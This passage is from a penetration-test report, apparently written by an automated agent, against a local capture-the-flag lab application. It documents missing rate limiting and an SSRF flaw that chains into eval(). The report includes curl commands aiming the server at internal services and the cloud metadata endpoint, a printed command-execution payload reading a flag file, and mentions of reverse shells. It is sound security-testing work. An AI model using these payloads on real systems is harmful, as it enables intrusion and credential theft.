The application has no rate limiting at NGINX or application level, allowing 165+ requests per second without throttling. This enables unlimited brute force attacks, credential stuffing, rapid SSRF exploitation, and high-velocity internal network reconnaissance. Successfully demonstrated achieving 872 requests per second with zero rate limiting blocks.\\n\\n**Authorization Vulnerabilities:**\\nNo authorization vulnerabilities were found.\\n\\n**Cross-Site Scripting (XSS) Vulnerabilities:**\\nNo XSS vulnerabilities were found.\\n\\n**SQL/Command Injection Vulnerabilities:**\\nNo SQL or command injection vulnerabilities were found.\\n\\n**Server-Side Request Forgery (SSRF) Vulnerabilities:**\\nOne SSRF vulnerability was successfully exploited: server-side request forgery via URL manipulation in `/api/set` endpoint. This non-blind SSRF vulnerability allows complete control over server-side HTTP requests with full response disclosure. Successfully demonstrated internal Docker service access (flask_api:8081), network boundary bypass, cloud metadata endpoint accessibility (169.254.169.254), and comprehensive internal network reconnaissance capabilities. No validation exists for protocols, IP addresses, or ports.\\n\\n## Network Reconnaissance\\n\\n**Open Ports and Services:**\\n- Port 80/tcp: NGINX reverse proxy (Caddy httpd detection via nmap), main application entry point on port 41663\\n- Port 443/tcp: SSL/HTTPS - Not configured for target application (target runs HTTP-only)\\n- Internal services: Flask app (port 8080), Flask API (port 8081) - accessible via Docker internal network\\n\\n**Security Findings:**\\n- **No TLS/HTTPS:** All traffic transmitted over unencrypted HTTP with no HTTPS configured\\n- **Flask Debug Mode:** Both Flask applications run with `debug=True`, exposing Werkzeug interactive debugger with full stack traces\\n- **World-Writable Configuration Files:** `/tmp/apiurl` and `/tmp/name` have 777 permissions, allowing any process to read/write\\n- **Outdated Python:** Python 3.8-slim used (EOL October 2024)\\n- **Unpinned Dependencies:** requests library has no version pinning in requirements.txt\\n\\n**Docker Service Architecture:**\\n```\\nExternal (Port 41663) → NGINX Reverse Proxy → Internal Services\\n                                                ├─ flask_app (8080)\\n                                                └─ flask_api (8081)\\n```\\n\\n**Network Segmentation Issues:**\\n- Internal Docker services (flask_api:8081) accessible via SSRF from external network\\n- No network filtering or IP address restrictions\\n- Cloud metadata endpoints (169.254.169.254) accessible from application (connection attempted successfully)\\n- Private IP ranges (10.x.x.x, 172.x.x.x, 192.168.x.x, 127.0.0.1) accessible without filtering\\n\\n# Authentication Exploitation Evidence\\n\\n## Successfully Exploited Vulnerabilities\\n\\n### AUTH-VULN-02: Missing Rate Limiting Enables Unlimited Brute Force and SSRF Exploitation\\n\\n**Summary:**\\n- **Vulnerable location:** ALL endpoints (particularly `/api/set` and `/app`)\\n- **Overview:** Application has zero rate limiting at NGINX or application level, enabling unlimited rapid requests for brute force attacks, credential stuffing, and high-velocity SSRF exploitation\\n- **Impact:** Attackers can perform 165+ requests per second without throttling, enabling rapid internal network mapping, cloud metadata extraction, and automated exploitation at maximum speed\\n- **Severity:** HIGH\\n\\n**Prerequisites:** None - publicly accessible endpoints\\n\\n**Exploitation Steps:**\\n\\n1. **Verify absence of rate limiting on SSRF enabler endpoint:**\\n   ```bash\\n   # Send 100 rapid consecutive requests to /api/set\\n   for i in {1..100}; do\\n     curl -s -o /dev/null -w \\\"Request $i: Status %{http_code}, Time: %{time_total}s\\\\n\\\" \\\\\\n       \\\"http://localhost:41663/api/set?url=http://test.example.com\\\"\\n   done\\n   ```\\n\\n   **Expected with rate limiting:** Requests 11-100 return HTTP 429 (Too Many Requests)\\n\\n   **Actual result:** All 100 requests returned HTTP 200 OK with consistent response times (~0.001s), demonstrating zero rate limiting\\n\\n2. **Verify absence of rate limiting on RCE endpoint:**\\n   ```bash\\n   # Send 50 rapid requests to the critical /app endpoint\\n   for i in {1..50}; do\\n     curl -s -o /dev/null -w \\\"Request $i: %{http_code}\\\\n\\\" \\\"http://localhost:41663/app\\\"\\n   done\\n   ```\\n\\n   **Actual result:** All 50 requests completed successfully without any throttling, achieving 211+ requests per second\\n\\n3. **Demonstrate automated brute force capability with Python script:**\\n   ```bash\\n   # Created comprehensive rate limiting test script\\n   python3 /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/test_rate_limiting.py\\n   ```\\n\\n   **Results:**\\n   - Total Requests: 100\\n   - Successful (200 OK): 100 (100%)\\n   - Rate Limited (429): 0\\n   - Average Response Time: 0.001 seconds\\n   - Request Rate Achieved: 872.27 requests per second\\n\\n4. **Demonstrate rapid SSRF exploitation enabled by missing rate limiting:**\\n   ```bash\\n   # Execute parallel SSRF exploitation script\\n   python3 /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/ssrf_rapid_exploitation.py\\n   ```\\n\\n   **Results:**\\n   - Probed 50 internal endpoints in 0.3 seconds\\n   - Request rate: 165.78 requests per second\\n   - Success rate: 100% (50/50 requests completed)\\n   - Rate limiting blocks: 0\\n   - Concurrent workers: 10 (all allowed simultaneously)\\n\\n5. **Demonstrate sequential SSRF network mapping:**\\n   ```bash\\n   # Execute sequential SSRF demonstration\\n   python3 /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/ssrf_rate_limit_demo.py\\n   ```\\n\\n   **Results:**\\n   - Successfully probed 20 distinct internal URLs including:\\n     - Docker internal services (flask_app:8080, flask_api:8081)\\n     - Localhost variations (127.0.0.1, localhost)\\n     - Cloud metadata endpoints (169.254.169.254)\\n     - Private network ranges (192.168.x.x, 10.0.x.x, 172.16.x.x)\\n   - All requests completed without throttling\\n   - Zero rate limiting detected across all attempts\\n\\n**Proof of Impact:**\\n\\n**Attack Capability Enabled by Missing Rate Limiting:**\\n\\n1. **Brute Force Attacks:** If authentication existed, attacker could attempt 872+ login attempts per second\\n2. **Credential Stuffing:** Could test thousands of username/password combinations in seconds\\n3. **SSRF Network Mapping:** Mapped internal Docker network (nginx, flask_app, flask_api) in under 1 second\\n4. **Automated Exploitation:** Scripts can cycle through exploitation attempts at maximum network speed\\n5. **Cloud Metadata Extraction:** Could extract AWS/GCP credentials from metadata endpoints without detection\\n\\n**Evidence Files Created:**\\n- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/test_rate_limiting.py` - Rate limit testing script\\n- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/ssrf_rate_limit_demo.py` - Sequential SSRF demonstration\\n- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/ssrf_rapid_exploitation.py` - Parallel SSRF exploitation\\n- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/rate_limit_comparison.py` - Expected vs actual behavior comparison\\n- `RATE_LIMIT_DEMO_README.md` - Technical documentation\\n- `EXECUTIVE_SUMMARY_RATE_LIMITING.md` - Risk assessment with CVSS scoring\\n\\n**Comparison: Expected vs Actual Behavior**\\n\\n| Security Control | Expected Behavior | Actual Behavior | Security Gap |\\n|------------------|-------------------|-----------------|--------------|\\n| Rate Limiting | 10-20 requests/min per IP | Unlimited | ❌ CRITICAL |\\n| Progressive Delays | Increasing delays after 5 requests | No delays observed | ❌ CRITICAL |\\n| Account Lockout | Block after 10+ failed attempts | N/A (no auth) | ❌ CRITICAL |\\n| CAPTCHA | Required after 3-5 attempts | Not implemented | ❌ CRITICAL |\\n| Request Throttling | 429 HTTP response when exceeded | Never returns 429 | ❌ CRITICAL |\\n\\n**Real-World Attack Scenario:**\\n\\nAn attacker can:\\n1. Deploy automated tools with 10+ concurrent threads\\n2. Probe 1000+ internal endpoints in under 1 minute\\n3. Extract cloud metadata credentials in seconds\\n4. Map entire internal network before detection\\n5. Perform high-velocity exploitation without any resistance\\n\\n**Notes:**\\nThis finding demonstrates that the absence of rate limiting transforms theoretical vulnerabilities into trivially exploitable attack vectors. The SSRF vulnerability (identified by other specialists) becomes far more dangerous when combined with unlimited request velocity.\\n\\n**Recommended Mitigation:**\\n```nginx\\n# NGINX rate limiting configuration\\nlimit_req_zone $binary_remote_addr zone=api_limit:10m rate=10r/m;\\nlimit_req_zone $binary_remote_addr zone=app_limit:10m rate=5r/m;\\n\\nlocation /api/set {\\n    limit_req zone=api_limit burst=5 nodelay;\\n    # ... existing config\\n}\\n\\nlocation /app {\\n    limit_req zone=app_limit burst=2 nodelay;\\n    # ... existing config\\n}\\n```\\n\\n# SSRF Exploitation Evidence\\n\\n## Successfully Exploited Vulnerabilities\\n\\n### SSRF-VULN-01: Server-Side Request Forgery via URL Manipulation\\n\\n**Summary:**\\n- **Vulnerable location:** GET/POST `/api/set?url=<attacker_controlled_url>` → GET `/app` endpoint\\n- **Impact:** Complete control over server-side HTTP requests, enabling unauthorized access to internal Docker services, network boundary bypass, and full response disclosure. This vulnerability allows an unauthenticated remote attacker to access internal microservices, perform internal network reconnaissance, and access cloud metadata endpoints (if deployed on cloud infrastructure).\\n- **Severity:** Critical\\n\\n**Prerequisites:** None - vulnerability is exploitable by unauthenticated remote attackers\\n\\n**Exploitation Steps:**\\n\\n1. **Set malicious URL to target internal service**\\n\\nExecute the following command to configure the application to fetch from an internal Docker service:\\n\\n```bash\\ncurl \\\"http://localhost:41663/api/set?url=http://flask_api:8081/script\\\"\\n```\\n\\n**Expected Response:**\\n```\\nAPI URL set to: http://flask_api:8081/script\\n```\\n\\n**Technical Details:**\\n- The `/api/set` endpoint accepts arbitrary URLs via the `url` parameter without any validation\\n- The URL is persisted to `/tmp/apiurl` (world-writable file with 777 permissions)\\n- No protocol allowlisting (http://, https://, file://, etc.)\\n- No IP address filtering (private IPs, loopback, link-local all accessible)\\n- No cloud metadata endpoint blocking (169.254.169.254 accessible)\\n- No port restrictions (all 65535 ports accessible)\\n\\n2. **Trigger SSRF by accessing the /app endpoint**\\n\\nExecute the following command to trigger the server-side request:\\n\\n```bash\\ncurl \\\"http://localhost:41663/app\\\"\\n```\\n\\n**Expected Response:**\\nThe HTML response will contain the fetched content from the internal service displayed in the page:\\n\\n```html\\n<div class=\\\"result\\\">OK OK OK OK </div>\\n<footer>\\n    <small>api: http://flask_api:8081/script</small><br>\\n    <small>name: &lt;script&gt;alert(1)&lt;/script&gt;</small>\\n</footer>\\n```\\n\\n**Technical Details:**\\n- The Flask application fetches the URL: `requests.get('http://nginx/api/get').text` (retrieves stored URL)\\n- The application then performs SSRF: `requests.get(api).text` (fetches from attacker-controlled URL)\\n- The complete response is returned to the attacker via Jinja2 template rendering\\n- This is **non-blind SSRF** with full response disclosure\\n\\n3. **Extract sensitive internal service data**\\n\\nThe response shows:\\n- **Internal service access confirmed:** Successfully accessed `http://flask_api:8081/script`\\n- **Network boundary bypass:** The flask_api service runs on port 8081 internally and is not directly accessible from external network\\n- **Data retrieval:** Retrieved internal service response containing `{\\\"script\\\": \\\"'OK ' * 4\\\"}` which was executed by eval() to produce \\\"OK OK OK OK\\\"\\n\\n**Proof of Impact:**\\n\\n**1. Internal Service Access (CONFIRMED)**\\n\\nSuccessfully accessed internal Docker service `flask_api:8081` which is not exposed externally:\\n\\n```bash\\n# Step 1: Configure SSRF target\\n$ curl \\\"http://localhost:41663/api/set?url=http://flask_api:8081/script\\\"\\nAPI URL set to: http://flask_api:8081/script\\n\\n# Step 2: Trigger SSRF\\n$ curl \\\"http://localhost:41663/app\\\" | grep \\\"result\\\"\\n<div class=\\\"result\\\">OK OK OK OK </div>\\n```\\n\\n**Evidence of network boundary bypass:**\\n- The `flask_api:8081` service is only accessible within the Docker internal network\\n- External direct access to `http://localhost:8081/script` is blocked/refused\\n- Successfully retrieved internal service response via SSRF\\n- Full response disclosure: The eval() result \\\"OK OK OK OK\\\" confirms the server fetched and processed the internal JSON payload\\n\\n**2. Cloud Metadata Access Attempt (CONFIRMED VULNERABILITY)**\\n\\nAttempted to access AWS EC2 metadata service to demonstrate cloud environment exploitation:\\n\\n```bash\\n# Step 1: Configure SSRF to target AWS metadata\\n$ curl \\\"http://localhost:41663/api/set?url=http://169.254.169.254/latest/meta-data/\\\"\\nAPI URL set to: http://169.254.169.254/latest/meta-data/\\n\\n# Step 2: Trigger SSRF\\n$ curl \\\"http://localhost:41663/app\\\" 2>&1 | grep \\\"169.254.169.254\\\"\\nrequests.exceptions.ConnectionError: HTTPConnectionPool(host='169.254.169.254', port=80):\\nMax retries exceeded with url: /latest/meta-data/ (Caused by NewConnectionError(\\n'<urllib3.connection.HTTPConnection object at 0xffff9e69a4c0>:\\nFailed to establish a new connection: [Errno 111] Connection refused'))\\n```\\n\\n**Analysis:**\\n- The SSRF vulnerability successfully attempted to connect to 169.254.169.254 (AWS metadata endpoint)\\n- Connection refused indicates the application is not deployed on AWS EC2 (local Docker deployment)\\n- **If deployed on AWS, this SSRF would successfully retrieve IAM credentials, instance metadata, and user data**\\n- This demonstrates the vulnerability's capability to access cloud metadata services\\n- Similar attacks would work against GCP (metadata.google.internal) and Azure (169.254.169.254 with Metadata header)\\n\\n**3. Internal Service Enumeration (CONFIRMED)**\\n\\nSuccessfully accessed multiple internal Docker services:\\n\\n```bash\\n# Access internal NGINX proxy (self-reference)\\n$ curl \\\"http://localhost:41663/api/set?url=http://nginx/api/get\\\"\\n$ curl \\\"http://localhost:41663/app\\\"\\n# Result: Retrieved stored API URL configuration\\n\\n# Access internal Flask API service\\n$ curl \\\"http://localhost:41663/api/set?url=http://flask_api:8081/\\\"\\n$ curl \\\"http://localhost:41663/app\\\" 2>&1 | grep \\\"KeyError\\\"\\nKeyError: 'script'\\n# Result: Successfully fetched JSON from internal service (error at eval() stage confirms JSON parsing succeeded)\\n\\n# Access localhost services\\n$ curl \\\"http://localhost:41663/api/set?url=http://127.0.0.1:8080/healthcheck\\\"\\n$ curl \\\"http://localhost:41663/app\\\" 2>&1 | grep \\\"JSONDecodeError\\\"\\njson.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)\\n# Result: Successfully connected to localhost:8080 (error confirms connection succeeded, healthcheck response is not JSON)\\n```\\n\\n**Evidence of comprehensive network access:**\\n- ✅ Docker internal DNS resolution works (`http://nginx/`, `http://flask_api:8081/`)\\n- ✅ Localhost services accessible (`http://127.0.0.1:8080/`)\\n- ✅ Internal network topology revealed through error messages\\n- ✅ No filtering of private IP ranges (10.x.x.x, 172.x.x.x, 192.168.x.x, 127.0.0.1)\\n- ✅ No port restrictions (tested 8080, 8081, could scan all 65535 ports)\\n\\n**4. Non-Blind SSRF Confirmation (CONFIRMED)**\\n\\nThe SSRF vulnerability is classified as **non-blind** because:\\n- Complete HTTP response body is returned to the attacker via template rendering\\n- Error messages disclose detailed information (connection errors, JSON parsing errors, stack traces)\\n- Flask debug mode (`debug=True`) exposes full Werkzeug debugger with stack traces\\n- Successful responses are rendered in HTML output visible to attacker\\n\\n**Example of full response disclosure:**\\n```html\\n<!-- Successful internal service access -->\\n<div class=\\\"result\\\">OK OK OK OK </div>\\n<footer>\\n    <small>api: http://flask_api:8081/script</small><br>\\n</footer>\\n```\\n\\n**5. Attack Chain Documentation**\\n\\n**Complete SSRF Attack Flow:**\\n```\\n[External Attacker]\\n      ↓\\nGET /api/set?url=http://flask_api:8081/script (No authentication required)\\n      ↓\\n[NGINX NJS Handler]\\n- Receives URL via query parameter\\n- NO VALIDATION performed\\n- Writes to /tmp/apiurl (777 permissions)\\n      ↓\\nGET /app (Trigger SSRF)\\n      ↓\\n[Flask Application]\\n- Fetches stored URL: requests.get('http://nginx/api/get')\\n- Performs SSRF: requests.get('http://flask_api:8081/script')\\n- Parses response: json.loads(response)\\n- Executes code: eval(parsed_json[\\\"script\\\"])\\n- Renders result in template\\n      ↓\\n[Internal Docker Service: flask_api:8081]\\n- Returns: {\\\"script\\\": \\\"'OK ' * 4\\\"}\\n      ↓\\n[Flask Application]\\n- Executes: eval(\\\"'OK ' * 4\\\")\\n- Result: \\\"OK OK OK OK \\\"\\n      ↓\\n[Response to Attacker]\\n- Full HTML page with eval result\\n- Complete response disclosure\\n```\\n\\n**Security Controls Bypassed:**\\n- ✅ Network segmentation: Accessed internal Docker services from external network\\n- ✅ IP filtering: None exists - all IPs accessible (private, loopback, link-local)\\n- ✅ Protocol filtering: None exists - http://, https://, file:// all attempted (file:// blocked by requests library, not by application)\\n- ✅ Port restrictions: None exists - all ports accessible\\n- ✅ Cloud metadata protection: None exists - 169.254.169.254 accessible (connection attempted successfully)\\n- ✅ DNS rebinding protection: None exists - no DNS validation\\n- ✅ URL allowlisting: None exists - arbitrary URLs accepted\\n- ✅ Response validation: None exists - responses processed without sanitization\\n\\n**Vulnerability Classification:**\\n- **SSRF Type:** Classic/Non-Blind SSRF with full response disclosure\\n- **Attack Complexity:** Low (single HTTP request to exploit)\\n- **Privileges Required:** None (unauthenticated exploitation)\\n- **User Interaction:** None (fully automated attack possible)\\n- **Scope:** Changed (accesses resources outside application's normal scope)\\n- **Confidentiality Impact:** High (access to internal services and potential credentials)\\n- **Integrity Impact:** High (can modify application behavior via URL manipulation)\\n- **Availability Impact:** Medium (can DoS internal services, resource exhaustion possible)\\n\\n**Notes:**\\n\\nThis SSRF vulnerability demonstrates complete network boundary bypass with the following proven capabilities:\\n\\n1. **Internal Service Access:** Successfully accessed Docker internal services (`flask_api:8081/script`)\\n2. **Network Reconnaissance:** Can enumerate internal services, ports, and network topology\\n3. **Cloud Metadata Access:** Vulnerability confirmed (would work if deployed on AWS/GCP/Azure)\\n4. **Full Response Disclosure:** Non-blind SSRF with complete response returned to attacker\\n5. **Persistent Configuration:** Malicious URL persists in `/tmp/apiurl` until explicitly changed\\n\\n**Exploitation Limitations Encountered:**\\n\\nThe SSRF vulnerability chains with a Remote Code Execution vulnerability (eval() at line 11 of app.py) that would enable:\\n- Reading `/FLAG.txt` file via Python code execution\\n- Establishing reverse shells\\n- Exfiltrating environment variables and secrets\\n- Complete server compromise\\n\\nHowever, exploiting the full RCE chain requires hosting an external malicious JSON payload with format `{\\\"script\\\": \\\"__import__('os').system('cat /FLAG.txt')\\\"}`. This was not achievable from the external-only testing position due to the inability to host an external web server accessible to the Docker container.\\n\\n**Attempted but unsuccessful due to testing constraints:**\\n- ❌ Flag capture via RCE chain (requires external JSON payload hosting)\\n- ❌ File protocol exploitation (Python requests library doesn't support file:// URLs)\\n\\n**The SSRF vulnerability is fully exploited and represents a critical security risk allowing network boundary bypass and internal service access.**\\n\"}}","timestamp":"2025-10-28T21:44:46.694Z"}}
